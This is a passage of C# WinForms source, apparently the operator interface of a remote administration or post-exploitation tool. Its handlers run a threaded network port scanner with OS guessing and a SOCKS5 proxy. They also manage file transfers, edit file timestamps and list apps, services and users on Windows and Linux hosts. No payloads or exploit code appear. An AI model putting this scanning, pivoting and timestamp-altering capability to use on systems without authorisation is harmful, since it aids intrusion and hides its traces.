                string szDir = Path.Combine(Application.StartupPath, "Plugins", node.FullPath);
                string szIndexPath = Path.Combine(szDir, "index.html");

                var manifest = m_plugin.fnLoadPluginManifest(szDir);
                if (manifest == null || !manifest.HasValue)
                {
                    if (!File.Exists(szIndexPath))
                    {
                        node.Expand();
                        return;
                    }

                    node.Expand();
                    webViewPlugin.CoreWebView2.Navigate(szIndexPath);
                    return;
                }

                node.Expand();

                var plugin = manifest.Value;

                webViewPlugin.CoreWebView2.Navigate(szIndexPath);

                var dict = new Dictionary<string, string>
                {
                    { "Name", plugin.szPluginName },
                    { "Version", plugin.szVersion },
                    { "Author", plugin.szAuthor },
                    { "Description", plugin.szDescription },
                };

                foreach (string szKey in dict.Keys)
                {
                    ListViewItem item = new ListViewItem(szKey);
                    item.SubItems.Add(dict[szKey]);

                    listView15.Items.Add(item);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void toolStripMenuItem48_Click(object sender, EventArgs e)
        {
            frmScanHost f = new frmScanHost(m_iniMgr);
            if (f.ShowDialog() != DialogResult.OK)
                return;

            if (string.IsNullOrEmpty(f.m_szPorts) || string.IsNullOrEmpty(f.m_szHosts))
                return;

            try
            {
                List<string> lsIP = clsfnLAN.fnParseIPRange(f.m_szHosts);
                List<int> lsPort = clsfnLAN.fnParsePortList(f.m_szPorts);

                if (lsIP.Count == 0 || lsPort.Count == 0)
                {
                    richTextBox3.AppendText($"[-] Invalid pattern, please check the input hosts and ports\n");
                    return;
                }

                richTextBox3.AppendText($"[*] Ready to scan: {lsIP.Count * lsPort.Count}\n");

                m_lan.m_dicHost.Clear();
                listView14.Items.Clear();

                object lvLock = new object();
                var callback = (string ip, int port) =>
                {
                    lock (lvLock)
                    {
                        bool bExists = false;
                        Invoke(() => bExists = listView14.FindItemWithText(ip) != null);

                        if (m_lan.m_dicHost.ContainsKey(ip))
                            m_lan.m_dicHost[ip].Add(port);
                        else
                            m_lan.m_dicHost.Add(ip, new List<int> { port });

                        ListViewItem? item = null;
                        Invoke(() => item = listView14.FindItemWithText(ip));

                        if (item == null)
                        {
                            item = new ListViewItem(ip);
                            item.ImageKey = "Unknown";

                            Invoke(() => listView14.Items.Add(item));
                        }
                        else
                        {
                            if (m_lan.m_dicHost[ip].Contains(135) || m_lan.m_dicHost[ip].Contains(139) || m_lan.m_dicHost[ip].Contains(445))
                                Invoke(() => item.ImageKey = "Windows");
                            else if (m_lan.m_dicHost[ip].Contains(22))
                                Invoke(() => item.ImageKey = "Linux");
                        }

                        Invoke(() =>
                        {
                            richTextBox3.AppendText($"[*] Discovered new host: {ip}:{port}\n");
                        });
                    }
                };

                int nThread = f.m_nThread;

                await m_lan.fnStart(lsIP, lsPort, callback, () => Invoke(() => { richTextBox3.AppendText($"[+] Finished scanning\n"); }), nThread);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void toolStripMenuItem49_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView14.SelectedItems)
            {
                string szIP = item.Text;
                var ports = m_lan.m_dicHost[szIP];

                frmPortInfo f = new frmPortInfo(szIP, ports);
                f.Show();
            }
        }

        private void toolStripMenuItem50_Click(object sender, EventArgs e)
        {
            listView14.Items.Clear();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            try
            {
                if (m_socks5.m_bIsRunning)
                    return;

                int nPort = (int)numericUpDown1.Value;

                _ = Task.Run(async () =>
                {
                    try
                    {
                        await m_socks5.fnStartAsync(nPort);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            try
            {
                if (!m_socks5.m_bIsRunning)
                    return;

                m_socks5.fnStop();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void listView14_DoubleClick(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView14.SelectedItems)
            {
                string szIP = item.Text;
                var ports = m_lan.m_dicHost[szIP];

                frmPortInfo f = new frmPortInfo(szIP, ports);
                f.Show();
            }
        }

        // File.Datetime
        private void toolStripMenuItem14_Click(object sender, EventArgs e)
        {
            var entries = listView2.SelectedItems.Cast<ListViewItem>().Select(x => fnFileGetItemTag(x)).Where(x => !x.bIsDirectory).ToList();
            if (entries.Count == 0)
                return;

            var entry = entries.First();
            frmFileDateTime f = new frmFileDateTime(m_fileMgr, entry.szEntryPath, entry.dtLastAccessedDate);
            f.ShowDialog();

            fnFileMgrRefresh();
        }

        private void toolStripMenuItem51_Click(object sender, EventArgs e)
        {
            if (m_fileMgr.m_bDownloadFile || m_fileMgr.m_bUploadFile)
            {
                DialogResult dr = MessageBox.Show("Your files are still being transferred. Do you want to stop all transfers?", "Wait!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (dr != DialogResult.Yes)
                    return;
            }

            try
            {
                m_fileMgr.m_bDownloadFile = false;
                m_fileMgr.m_bUploadFile = false;

                TreeNode nodeUpload = treeView4.Nodes[0];
                TreeNode nodeDownload = treeView4.Nodes[1];

                nodeUpload.Nodes.Clear();
                nodeDownload.Nodes.Clear();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void toolStripMenuItem52_Click(object sender, EventArgs e)
        {
            treeView2.ExpandAll();
        }

        private void toolStripMenuItem53_Click(object sender, EventArgs e)
        {
            treeView2.CollapseAll();
        }

        private void toolStripComboBox1_Click(object sender, EventArgs e)
        {

        }

        private async void toolStripComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            treeView1.Nodes.Clear();

            string szPluginsBaseDir = Path.Combine(Application.StartupPath, "Plugins");
            int nCount = await fnLoadAllPlugins(szPluginsBaseDir, treeView1.Nodes);

            treeView1.ExpandAll();

            toolStripStatusLabel8.Text = $"Plugin[{nCount}]";
        }

        private async void toolStripButton16_Click(object sender, EventArgs e)
        {
            treeView1.Nodes.Clear();

            string szHtmlPath = Path.Combine(m_plugin.m_szPluginsDir, "index.html");
            webViewPlugin.CoreWebView2.Navigate(szHtmlPath);

            string szPluginsBaseDir = Path.Combine(Application.StartupPath, "Plugins");
            int nCount = await fnLoadAllPlugins(szPluginsBaseDir, treeView1.Nodes);

            treeView1.ExpandAll();

            toolStripStatusLabel8.Text = $"Plugin[{nCount}]";
        }

        private void textBox12_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                if (string.IsNullOrEmpty(textBox12.Text))
                {
                    string szHtmlPath = Path.Combine(m_plugin.m_szPluginsDir, "index.html");
                    webViewPlugin.CoreWebView2.Navigate(szHtmlPath);
                }
                else
                {
                    TreeNode node = fnFindNodeWithFullPath(treeView1.Nodes, textBox12.Text);
                    if (node == null)
                    {
                        string szHtmlPath = Path.Combine(m_plugin.m_szPluginsDir, "404.html");
                        webViewPlugin.CoreWebView2.Navigate(szHtmlPath);

                        return;
                    }

                    treeView1.SelectedNode = node;
                }
            }
        }

        private async void textBox13_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                treeView1.Nodes.Clear();

                string szPluginsBaseDir = Path.Combine(Application.StartupPath, "Plugins");
                int nCount = await fnLoadAllPlugins(szPluginsBaseDir, treeView1.Nodes, textBox13.Text);

                treeView1.ExpandAll();

                toolStripStatusLabel8.Text = $"Plugin[{nCount}]";
            }
        }

        private void toolStripMenuItem54_Click(object sender, EventArgs e)
        {
            treeView1.ExpandAll();
        }

        private void toolStripMenuItem55_Click(object sender, EventArgs e)
        {
            treeView1.CollapseAll();
        }

        private void toolStripMenuItem56_Click(object sender, EventArgs e)
        {
            List<ListViewItem> items = listView2.SelectedItems.Cast<ListViewItem>().ToList();
            if (items.Count == 0)
                return;

            ListViewItem? item = items.FirstOrDefault();
            if (item == null)
                return;

            var entry = fnFileGetItemTag(item);

            frmRename f = new frmRename(m_fileMgr, entry.szEntryPath);
            f.ShowDialog();

            fnFileMgrRefresh();
        }

        private async void toolStripButton17_Click(object sender, EventArgs e)
        {
            try
            {
                await fnWinGetApp();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void toolStripButton18_Click(object sender, EventArgs e)
        {
            try
            {
                await fnWinGetService();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void toolStripButton19_Click(object sender, EventArgs e)
        {
            try
            {
                await fnLinuxGetApp();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void toolStripButton20_Click(object sender, EventArgs e)
        {
            try
            {
                await fnLinuxGetService();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void toolStripButton21_Click(object sender, EventArgs e)
        {
            await fnWinUserInit();
        }
    }
}
